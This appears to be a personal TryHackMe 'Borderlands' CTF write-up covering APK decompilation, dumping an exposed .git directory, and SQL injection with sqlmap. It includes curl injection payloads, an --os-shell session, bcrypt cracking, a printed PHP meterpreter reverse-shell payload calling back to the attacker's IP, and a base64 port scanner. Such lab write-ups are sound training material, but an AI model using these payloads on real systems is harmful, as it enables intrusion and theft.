<p>Networking . BGP, Border Gateway Protocol . Exploitation</p>

<h1 align="center">Borderlands</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/6aec40ad-4820-4c26-9c07-bb189b72aebb"><br>
August 31, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>482</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>...</em>.<br>
Access it <a href=""</a>here.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/df979e98-b488-43fc-ac5e-8be4a7bded16"></p>

<br>
<br>

<p align="left">Summary &nbsp;&nbsp;</p>
    
<p>
    
- [Nmap](#1)<br>
- [API Key "AND*"](#2)<br>
- [API Key "WEB*"](#3)<br>
- [API Key "GIT*"](#4)<br></p>
    
<br>

<h2>Task 1 . Introduction</h2>

<p><em>Answer the questions below</em></p>
<br>
<br>
<h2 align="center">Nmap<a id='1'></a></h2>
<p>

- 22 : SSH<br>
- 80 : HTTP : nginx 1.14.0<br> xx.xxx.xx.xx:80/.git<br></p>

```bash
:~/Borderlands# nmap -sC -sV -sS -p- -O -A xx.xxx.xx.xx


```

```bash
:~/Borderlands# nmap -A xx.xxx.xx.xx


```

<h2 align="center">API Key "AND*"<a id='2'></a></h2>
<br>
<h3 align="center">Web port 80</h3>
<p  align="center">403 Forbidden</p>
<br>
<br>
<h3 align="center">apktool</h3>
<p  align="center">Downloaded the APK <code>mobile-app-prototype.apk</code> from the Web Application clicking <code>here</code>.</p>

<p align = "center"><img width="800px" src="https://github.com/user-attachments/assets/5adc39ba-8e0f-4623-81aa-005e5da10c7e"></p>

```bash
:~/Borderlands# ls
mobile-app-prototype.apk
```

<br>
<br>
<p  align="center">Installed <code>apktool</code>.</p>

```bash
:~/Borderlands# apt install apktool
```

<br>
<br>
<p  align="center">Executed <code>apktool</code> to decompile <code>mobile-app-prototype.apk</code>.</p>

```bash
:~/Borderlands# apktool d mobile-app-prototype.apk
I: Using Apktool 2.4.0-dirty on mobile-app-prototype.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: .../.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
```

<p align = "center"><img width="800px" src="https://github.com/user-attachments/assets/a935e1d0-7520-412c-a665-ccd845abf3c9"></p>

<br>
<br>
<p  align="center">Checked the decompiled content.</p>

```bash
:~/Borderlands/mobile-app-prototype/res/values# ls
attrs.xml  bools.xml  colors.xml  dimens.xml  drawables.xml  ids.xml  integers.xml  public.xml  strings.xml  styles.xml
```

<br>
<br>
<p  align="center">Discovered the encrypted API Key using <code>grep</code>.</p>

```bash
:~/Borderlands/mobile-app-prototype/res/values# grep -rn key
ids.xml:77:    <item type="id" name="tag_unhandled_key_event_manager" />
ids.xml:78:    <item type="id" name="tag_unhandled_key_listeners" />
public.xml:163:    <public type="attr" name="keylines" id="0x7f020094" />
public.xml:220:    <public type="attr" name="layout_keyline" id="0x7f0200cd" />
public.xml:628:    <public type="drawable" name="abc_menu_hardkey_panel_mtrl_mult" id="0x7f060035" />
public.xml:785:    <public type="id" name="tag_unhandled_key_event_manager" id="0x7f070084" />
public.xml:786:    <public type="id" name="tag_unhandled_key_listeners" id="0x7f070085" />
public.xml:892:    <public type="string" name="encrypted_api_key" id="0x7f0b0028" />
styles.xml:401:        <item name="panelBackground">@drawable/abc_menu_hardkey_panel_mtrl_mult</item>
styles.xml:542:        <item name="panelBackground">@drawable/abc_menu_hardkey_panel_mtrl_mult</item>
attrs.xml:213:    <attr name="keylines" format="reference" />
attrs.xml:352:    <attr name="layout_keyline" format="integer" />
strings.xml:43:    <string name="encrypted_api_key">CBQOSTEFZNL5U8LJB2hhBTDvQi2zQo</string>
```

<br>
<br>
<p  align="center">Discovered the API Key "AND*" using <code>CyberChef</code> and the Key.</p>

<p align = "center"><img width="800px" src="https://github.com/user-attachments/assets/ee87b70e-17a0-4b1b-83c0-21b63ee9e986"></p>

<br>

<p align = "center"><img width="800px" src="https://github.com/user-attachments/assets/39c424d7-ba9c-40af-8ff1-c34b7e5705e0"></p>

<br>
<br>
<p> 1.1. What is the API key that fits the following pattern: "AND*"<br>
<code>ANDVOWLDLAS5Q8OQZ2tuIPGcOu2mXk</code></p>

<br>
<h2 align="center">API Key "WEB*"<a id='3'></a></h2>
<h3 align="center">GitTools</h3>
<br>
<p align="center">Cloned GitTools repository.</p>

```bash
:~/Borderlands# git clone https://github.com/internetwache/GitTools
```

```bash
:~/Borderlands/GitTools# ls
Dumper  Extractor  Finder  LICENSE.md  README.md
```

```bash
:~/Borderlands/GitTools/Dumper# ls
gitdumper.sh  README.md
```

<br>
<br>
<p  align="center">Executed <code>gitdumper</code>.</p>

```bash
:~/Borderlands/GitTools/Dumper# ./gitdumper.sh http://xx.xxx.xx.xx/.git/ ~/Borderlands/xx.xxx.xx.xx/
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[+] Downloaded: HEAD

[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/6d/b3cf70b469de942f2f529166088cdfbbd5f764
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/15/2b2d9976cd37a68fd462af8e4ce21356b5485e
[+] Downloaded: objects/93/bab0a450caaa8c4d2632703636eccc69062bb4
[+] Downloaded: objects/79/c9539b6566b06d6dec2755fdf58f5f9ec8822f
[+] Downloaded: objects/b2/f776a52fe81a731c6c0fa896e7f9548aafceab
[+] Downloaded: objects/04/f1f411857cc972ae8ed5efcffa298f5f6168fb
[+] Downloaded: objects/fe/e5595bb2ba1d1ab005ec3de98367fe5d021e9f
[+] Downloaded: objects/0d/487f41b42eeb061fbd3a6aec8db01e139e514d
[+] Downloaded: objects/33/7c2224b69c29a0faf3143d2da16d9bb82e91fb
[+] Downloaded: objects/bf/9d9df13bf0565a2bb75753ec50be3723c72241
[+] Downloaded: objects/51/d63292792fb7f97728cd3dcaac3ef364f374ba
[+] Downloaded: objects/f0/baf222720667090e52874204868a052ea32dc7
[+] Downloaded: objects/3e/8ebd2ecafa693a3fdb9b91e4a694d133012c3b
[+] Downloaded: objects/77/e7884c18472152e372c060a6ba40dd555a5eed
[+] Downloaded: objects/2a/bf4c29f7ae182fa75ba9914fcd47c6614a9b29
[+] Downloaded: objects/e0/03b9156c54897414bc5958372b10d76fed64bb
[+] Downloaded: objects/09/1ed908bcb54a002d3194c375570a508747dd28
[+] Downloaded: objects/15/6f4e78a91e169db2e04b65767fc732b1ce2a7a
[+] Downloaded: objects/fd/efad64c4f3be0fe33ea5837c0fe75b8ee2ef2c
[+] Downloaded: objects/eb/d082255f4278c8dd239af2f8e985e0a66746e0
[+] Downloaded: objects/9e/b9f94f73113d785e65c7e3ec0cba54e0b7cf43
[+] Downloaded: objects/2a/116a56a6e31ef1836796936dbc05af1f986a26
[+] Downloaded: objects/03/d7929200ed474bce7934ea1985f4ac74983a62
[+] Downloaded: objects/64/80abf34a54d3055b437766be872a13bcebdf7d
[+] Downloaded: objects/4c/d24129c3255a3f7e84f7d42ddd94cccd2a697b
[+] Downloaded: objects/47/0cac65fcd0f8556f13997957a331628482aa96
[+] Downloaded: objects/22/29eb414d7945688b90d7cd0a786fd888bcc6a4
[+] Downloaded: objects/4f/4ced90fcad774ca4f9f966dbb227ebe7f77a83
[+] Downloaded: objects/b9/953f00f7ad7a26460fa249e00fe05eb52d224c
```

<h3 align="center">GitHack</h3>
<br>
<p align="center">Cloned GitHack repository.</p>

```bash
:~/Borderlands/GitHack# git clone https://github.com/lijiejie/GitHack
```

<br>
<br>
<p  align="center">Executed <code>gitdumperGitHack</code>.</p>

```bash
:~/Borderlands/GitHack# python3 GitHack.py http://xx.xxx.xx.xx/.git
[+] Download and parse index file ...
[+] CTX_WSUSpect_White_Paper.pdf
[+] Context_Red_Teaming_Guide.pdf
[+] Context_White_Paper_Pen_Test_101.pdf
[+] Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf
[+] Glibc_Adventures-The_Forgotten_Chunks.pdf
[+] api.php
[+] functions.php
[+] home.php
[+] index.php
[+] info.php
[OK] api.php
[OK] CTX_WSUSpect_White_Paper.pdf
[OK] Context_White_Paper_Pen_Test_101.pdf
[OK] Glibc_Adventures-The_Forgotten_Chunks.pdf
[OK] Context_Red_Teaming_Guide.pdf
[OK] functions.php
[OK] index.php
[OK] info.php
[OK] home.php
[OK] Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf
```

<br>
<br>
<p  align="center">Checked the content.</p>

```bash
:~/Borderlands/GitHack/xx.xxx.xx.xx# ls
api.php                               CTX_WSUSpect_White_Paper.pdf                            Glibc_Adventures-The_Forgotten_Chunks.pdf  info.php
Context_Red_Teaming_Guide.pdf         Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf  home.php
Context_White_Paper_Pen_Test_101.pdf  functions.php
```

<br>
<br>
<p  align="center">Discovered the API Key "WEB*" using <code>grep</code>.</p>

```bash
:~/Borderlands/GitHack/xx.xxx.xx.xx# grep -rn WEB
home.php:26:    echo ('<li><a href="api.php?documentid='.$documentid.'&amp;apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD">'.$document_name.'</a></li>');
home.php:41:            echo ('<input type="hidden" id="apikey" name="apikey" value="WEBLhvOJAH8d50Z4y5G5g4McG1GMGD" />');
api.php:5:if (!isset($_GET['apikey']) || ((substr($_GET['apikey'], 0, 20) !== "WEBLhvOJAH8d50Z4y5G5") && substr($_GET['apikey'], 0, 20) !== "ANDVOWLDLAS5Q8OQZ2tu" && substr($_GET['apikey'], 0, 20) !== "GITtFi80llzs4TxqMWtC"))
```

<br>
<p> 1.2. What is the API key that fits the following pattern: "WEB*"<br>
<code>WEBLhvOJAH8d50Z4y5G5g4McG1GMGD</code></p>

<br>
<h2 align="center">API Key "GIT*"<a id='4'></a></h2>
<br>
<p  align="center">I have just discovered the API Key "GIT*" in the previous step.</p>

```bash
:~/Borderlands/GitHack/xx.xxx.xx.xx# grep -rn WEB
home.php:26:    echo ('<li><a href="api.php?documentid='.$documentid.'&amp;apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD">'.$document_name.'</a></li>');
home.php:41:            echo ('<input type="hidden" id="apikey" name="apikey" value="WEBLhvOJAH8d50Z4y5G5g4McG1GMGD" />');
api.php:5:if (!isset($_GET['apikey']) || ((substr($_GET['apikey'], 0, 20) !== "WEBLhvOJAH8d50Z4y5G5") && substr($_GET['apikey'], 0, 20) !== "ANDVOWLDLAS5Q8OQZ2tu" && substr($_GET['apikey'], 0, 20) !== "GITtFi80llzs4TxqMWtC"))
```

<br>
<br>
<p  align="center">Even tough, practice more.</p>

```bash
:~/Borderlands/xx.xxx.xx.xx/.git# ls
COMMIT_EDITMSG  config  description  HEAD  index  info  logs  objects  refs
```

<br>
<br>
<p  align="center">Identified two directories within <code>logs</code>code>:
    
- <code>HEAD</code><br>
- <code>refs</code></p>

```bash
:~/Borderlands/xx.xxx.xx.xx/.git/logs# ls
HEAD  refs
```

<br>
<br>
<p  align="center">Even tough, practice more.</p>

```bash
:~/Borderlands/xx.xxx.xx.xx/.git# git log
commit 6db3cf70b469de942f2f529166088cdfbbd5f764 (HEAD -> master)
Author: Context Information Security <recruitment@contextis.com>
Date:   Tue Sep 10 14:44:31 2019 +0100

    added mobile apk for beta testing.

commit fee5595bb2ba1d1ab005ec3de98367fe5d021e9f
Author: Context Information Security <recruitment@contextis.com>
Date:   Tue Sep 10 14:43:26 2019 +0100

    added white paper pdf's

commit 04f1f411857cc972ae8ed5efcffa298f5f6168fb
Author: Context Information Security <recruitment@contextis.com>
Date:   Tue Sep 10 14:42:12 2019 +0100

    added theme

commit b2f776a52fe81a731c6c0fa896e7f9548aafceab
Author: Context Information Security <recruitment@contextis.com>
Date:   Tue Sep 10 14:41:00 2019 +0100

    removed sensitive data

commit 79c9539b6566b06d6dec2755fdf58f5f9ec8822f
Author: Context Information Security <recruitment@contextis.com>
Date:   Tue Sep 10 14:40:28 2019 +0100

    added basic prototype of api gateway

commit 93bab0a450caaa8c4d2632703636eccc69062bb4
Author: Context Information Security <recruitment@contextis.com>
Date:   Tue Sep 10 14:33:58 2019 +0100

    added under construction page

commit 152b2d9976cd37a68fd462af8e4ce21356b5485e
Author: Context Information Security <recruitment@contextis.com>
Date:   Tue Sep 10 14:31:11 2019 +0100

    created repo
```

```bash
:~/Borderlands/Target/.git# git cat-file -p 51d63292792fb7f97728cd3dcaac3ef364f374ba
100644 blob 2229eb414d7945688b90d7cd0a786fd888bcc6a4	api.php
100644 blob 9eb9f94f73113d785e65c7e3ec0cba54e0b7cf43	functions.php
100644 blob 2a116a56a6e31ef1836796936dbc05af1f986a26	home.php
100755 blob 470cac65fcd0f8556f13997957a331628482aa96	index.html
100644 blob 4f4ced90fcad774ca4f9f966dbb227ebe7f77a83	index.php
100644 blob 6480abf34a54d3055b437766be872a13bcebdf7d	info.php
```

<br>
<p> 1.3. What is the API key that fits the following pattern: "GIT*"<br>
<code>GITtFi80llzs4TxqMWtCotiTZpf0HC</code></p>

<br>
<br>
<p  align="center">Discovered the API Key "GIT*" using <code>git log</code>.</p>

```bash
:~/Borderlands/Target/.git# git cat-file -p 2229eb414d7945688b90d7cd0a786fd888bcc6a4
<?php

require_once("functions.php");

if (!isset($_GET['apikey']) || ((substr($_GET['apikey'], 0, 20) !== "WEBLhvOJAH8d50Z4y5G5") && substr($_GET['apikey'], 0, 20) !== "ANDVOWLDLAS5Q8OQZ2tu" && substr($_GET['apikey'], 0, 20) !== "GITtFi80llzs4TxqMWtCotiTZpf0HC"))
{
    die("Invalid API key");
}

if (!isset($_GET['documentid']))
{
    die("Invalid document ID");
}

/*
if (!isset($_GET['newname']) || $_GET['newname'] == "")
{
    die("invalid document name");
}
*/

$conn = setup_db_connection();

//UpdateDocumentName($conn, $_GET['documentid'], $_GET['newname']);

$docDetails = GetDocumentDetails($conn, $_GET['documentid']);
if ($docDetails !== null)
{
    //print_r($docDetails);
    echo ("Document ID: ".$docDetails['documentid']."<br />");
    echo ("Document Name: ".$docDetails['documentname']."<br />");
    echo ("Document Location: ".$docDetails['location']."<br />");
}

?>
```

<br>

<p> 1.4. What is the flag in the /var/www directory of the web app host? {FLAG:Webapp:XXX} <em> Hint : /var/www/flag.txt</em><br>
<code>{FLAG:Webapp:48a5f4bfef44c8e9b34b926051ad35a6}</code></p>

<p>Navigated to the path below, intercepted it with Burp Suite and saved the request to <code>req</code>.</p>

```bash
http://Target_IP/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1
```

<img width="1119" height="97" alt="image" src="https://github.com/user-attachments/assets/e9c504a7-b125-40ea-8470-53b277e98136" />

<br>

<img width="908" height="187" alt="image" src="https://github.com/user-attachments/assets/d50c873d-126b-4f7c-93f0-05f478c4656c" />

<br>


<h3>sqlmap</h3>


```bash
:~/Borderlands# sqlmap -r request.txt --risk=3 --level=3 --dump --batch
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.4#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

...
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: documentid (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1 AND 1278=1278

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1 AND (SELECT 8449 FROM(SELECT COUNT(*),CONCAT(0x7178626b71,(SELECT (ELT(8449=8449,1))),0x7171627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1 AND (SELECT 6817 FROM (SELECT(SLEEP(5)))KnNM)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=-2023 UNION ALL SELECT CONCAT(0x7178626b71,0x587a574543766d6e55636f7341664959665072586a674c77546c446f4159734348436f776a416d48,0x7171627171),NULL,NULL-- -
---
...                                        
Database: myfirstwebsite
Table: users
[1 entry]
+--------+----------+--------------------------------------------------------------+
| userid | username | password                                                     |
+--------+----------+--------------------------------------------------------------+
| 1      | billg    | $2y$10$wWeyIzGcD7TVwZ7y7d3UCO5eEssZShTQzBU2yIebvvQQw1y676zVW |
+--------+----------+--------------------------------------------------------------+

...
Database: myfirstwebsite                                                                                                             
Table: documents
[5 entries]
+------------+--------------------------------------------------------+--------------------------------------------------------+
| documentid | location                                               | documentname                                           |
+------------+--------------------------------------------------------+--------------------------------------------------------+
| 1          | Context_Red_Teaming_Guide.pdf                          | Context_Red_Teaming_Guide.pdf                          |
| 2          | Context_White_Paper_Pen_Test_101.pdf                   | Context_White_Paper_Pen_Test_101.pdf                   |
| 3          | CTX_WSUSpect_White_Paper.pdf                           | CTX_WSUSpect_White_Paper.pdf                           |
| 4          | Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf | Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf |
| 5          | Glibc_Adventures-The_Forgotten_Chunks.pdf              | Glibc_Adventures-The_Forgotten_Chunks.pdf              |
+------------+--------------------------------------------------------+--------------------------------------------------------+
```


<p><code>billg</code>code> : <code>$2y$10$wWeyIzGcD7TVwZ7y7d3UCO5eEssZShTQzBU2yIebvvQQw1y676zVW</code></p>

<br>

<h3>John The Ripper</h3>

```bash
:~/Borderlands# john hash --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
potato           (?)
1g 0:00:01:17 DONE (2025-07-21 00:28) 0.01298g/s 38.33p/s 38.33c/s 38.33C/s raluca..maricar
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

<img width="975" height="362" alt="image" src="https://github.com/user-attachments/assets/166a9a58-12c6-48bd-b53b-8fc06652dd12" />



<br>

<h3>Testing the suggested payloads to practice</h3>

```bash
:~/Borderlands# curl -s 'http://10.10.143.3/api.php? apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1 AND 1278=1278'
Document ID: 1<br />Document Name: Context_Red_Teaming_Guide.pdf<br />Document Location: Context_Red_Teaming_Guide.pdf<br />
```

```bash
:~/Borderlands# curl -s 'http://10.10.143.3/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1 AND (SELECT 8449 FROM(SELECT COUNT(*),CONCAT(0x7178626b71,(SELECT (ELT(8449=8449,1))),0x7171627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)'
Duplicate entry 'qxbkq1qqbqq1' for key '<group_key>
```

```bash
:~/Borderlands# curl -s 'http://10.10.143.3/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1 AND (SELECT 6817 FROM (SELECT(SLEEP(5)))KnNM)'
Document ID: 1<br />Document Name: Context_Red_Teaming_Guide.pdf<br />Document Location: Context_Red_Teaming_Guide.pdf<br />
```


```bash
:~/Borderlands# curl -s 'http://10.10.143.3/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1 AND (SELECT 6817 FROM (SELECT(SLEEP(5)))KnNM)'
Document ID: 1<br />Document Name: Context_Red_Teaming_Guide.pdf<br />Document Location: Context_Red_Teaming_Guide.pdf<br />
```


```bash
:~/Borderlands# curl -s 'http://10.10.143.3/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=-2023 UNION ALL SELECT CONCAT(0x7178626b71,0x587a574543766d6e55636f7341664959665072586a674c77546c446f4159734348436f776a416d48,0x7171627171),NULL,NULL-- -'
Document ID: qxbkqXzWECvmnUcosAfIYfPrXjgLwTlDoAYsCHCowjAmHqqbqq<br />Document Name: <br />Document Location: <br />
```

<br>

```bash
:~/Borderlands# sqlmap -r request.txt -D myfirstwebsite --os-shell
...
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
> 4
do you want sqlmap to further try to provoke the full path disclosure? [Y/n] Y
...
what do you want to use for writable directory?
[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs') (default)
[2] custom location(s)
[3] custom directory list file
[4] brute force search
> 4
...
use any additional custom directories [Enter for None]: /var/www
...
os-shell> ls
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output:
---
CTX_WSUSpect_White_Paper.pdf
Context_Red_Teaming_Guide.pdf
Context_White_Paper_Pen_Test_101.pdf
Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf
Glibc_Adventures-The_Forgotten_Chunks.pdf
api.php
functions.php
home.php
index.php
info.php
mobile-app-prototype.apk
shell.php
tmpbtnnk.php
tmpuzdiu.php
---
os-shell> ls /var/www
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output:
---
flag.txt
html
---
os-shell> cat /var/www/flag.txt
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output: '{FLAG:Webapp:48a5f4bfef44c8e9b34b926051ad35a6}'
os-shell> 
```

<br>

<p> 1.5. What is the flag in the /root/ directory of router1? {FLAG:Router1:XXX} <em> Hint : use python to portscan</em><br>
<code>{FLAG:Router1:c877f00ce2b886446395150589166dcd}</code></p>


<br>

<img width="1129" height="140" alt="image" src="https://github.com/user-attachments/assets/e28caee7-df5a-4072-9f02-259d27a0ac47" />



<h3>msfvenom</h3>



```bash
:~/Borderlands# msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.195.74 lport=4444 -f raw
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1113 bytes
/*<?php /**/ error_reporting(0); $ip = '10.10.195.74'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
```

<p><em>shell.php</em></p>

```bash
<?php /**/ error_reporting(0); $ip = '10.10.195.74'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
```

<img width="861" height="98" alt="image" src="https://github.com/user-attachments/assets/b5be2fd9-fe26-4d08-9ada-d6de87cc1e48" />

<img width="690" height="36" alt="image" src="https://github.com/user-attachments/assets/7e3d5409-07a3-4892-b575-e0ed4bb4f282" />

```bash
http://TargetIP/shell.php
```



```bash
msf6 >  use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > set lhost 10.10.195.74
lhost => 10.10.195.74
msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 10.10.195.74:4444 
[*] Sending stage (40004 bytes) to 10.10.143.3
[*] Meterpreter session 1 opened (10.10.195.74:4444 -> 10.10.143.3:45618) at 2025-07-21 00:53:03 +0100

meterpreter > whoami
[-] Unknown command: whoami. Run the help command for more details.
meterpreter > shell
Process 539 created.
Channel 0 created.
whoami
www-data
getent hosts
127.0.0.1       localhost
127.0.0.1       localhost ip6-localhost ip6-loopback
172.18.0.2      app.ctx.ctf app
172.16.1.10     app.ctx.ctf app
ss
NetidState      Recv-Q Send-Q             Local Address:Port  Peer Address:Port 
u_strESTAB      0      0                              * 25303            * 25302
u_strESTAB      0      0                              * 25399            * 25398
u_strESTAB      0      0                              * 25302            * 25303
u_strESTAB      0      0                              * 25398            * 25399
u_strESTAB      8      0       /run/php/php7.2-fpm.sock 35032            * 0    
tcp  FIN-WAIT-2 0      0                     172.18.0.2:http  10.10.195.74:60320
tcp  ESTAB      0      0                     172.18.0.2:45618 10.10.195.74:4444 
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@app:~/html$ ip -s neigh
ip -s neigh
172.18.0.1 dev eth0 lladdr 02:42:32:e1:80:54 ref 1 used 0/0/0 probes 1 DELAY
```


<p><em>arp.py</em></p>

```bash
echo 'aW1wb3J0IHNvY2tldAoKZm9yIGkgaW4gcmFuZ2UoMCwgMjU2KToKICAgIHNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICBzb2NrLnNldHRpbWVvdXQoMC41KQogICAgaXAgPSAnMTcyLjE2LjEue30nLmZvcm1hdChpKQogICAgaWYgMCA9PSBzb2NrLmNvbm5lY3RfZXgoKGlwLCAyMikpOgogICAgICAgIHNvY2suY2xvc2UoKQogICAgICAgIHByaW50KGlwICsgJyAgIE9OJyAsIGZsdXNoPVRydWUpCiAgICBlbHNlOgogICAgICAgIHByaW50KGlwLCAgZmx1c2g9VHJ1ZSkK' | base64 -d > arp.py
```

<img width="1066" height="242" alt="image" src="https://github.com/user-attachments/assets/e82cc626-31d8-48f9-a879-c2ebfd9fa87c" />


```bash
www-data@app:/dev/shm$ python3 arp.py
python3 arp.py
...
www-data@app:/dev/shm$ ip -s neigh
ip -s neigh
172.16.1.250 dev eth1  used 11/71/8 probes 6 FAILED
172.16.1.237 dev eth1  used 18/78/15 probes 6 FAILED
172.18.0.1 dev eth0 lladdr 02:42:32:e1:80:54 ref 1 used 187/0/182 probes 1 REACHABLE
172.16.1.254 dev eth1  used 9/69/6 probes 6 FAILED
172.16.1.241 dev eth1  used 16/76/13 probes 6 FAILED
172.16.1.232 dev eth1  used 20/80/17 probes 6 FAILED
172.16.1.245 dev eth1  used 14/74/11 probes 6 FAILED
172.16.1.236 dev eth1  used 18/78/15 probes 6 FAILED
172.16.1.231 dev eth1  used 21/81/18 probes 6 FAILED
172.16.1.249 dev eth1  used 12/72/9 probes 6 FAILED
172.16.1.240 dev eth1  used 16/76/13 probes 6 FAILED
172.16.1.235 dev eth1  used 19/79/16 probes 6 FAILED
172.16.1.253 dev eth1  used 10/70/7 probes 6 FAILED
172.16.1.244 dev eth1  used 14/74/11 probes 6 FAILED
172.16.1.239 dev eth1  used 17/77/14 probes 6 FAILED
172.16.1.230 dev eth1  used 21/81/18 probes 6 FAILED
172.16.1.128 dev eth1 lladdr 02:42:ac:10:01:80 used 72/72/57 probes 4 STALE
172.16.1.248 dev eth1  used 12/72/9 probes 6 FAILED
